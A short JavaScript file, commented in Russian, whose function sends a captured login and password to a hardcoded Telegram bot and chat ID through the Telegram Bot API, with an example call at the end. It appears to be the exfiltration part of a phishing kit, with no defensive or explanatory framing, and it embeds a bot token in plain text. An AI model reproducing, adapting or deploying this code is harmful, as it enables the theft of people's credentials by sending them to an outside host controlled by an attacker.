const botToken = '7900414107:AAGqO7zfGHNua1hBrvYH_uY8FlzZMmtefK0';
const chatId = '1342016402';

function sendMessageToTelegram(login, password) {
    const message = `🔐 Новый логин и пароль:\n👤 Логин: ${login}\n🔑 Пароль: ${password}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("✅ Логин и пароль отправлены в Telegram:", data);
            } else {
                console.error("❌ Ошибка Telegram API:", data);
            }
        })
        .catch(error => console.error("❌ Ошибка запроса:", error));
}

// Пример отправки логина и пароля
sendMessageToTelegram("example_user", "123456");
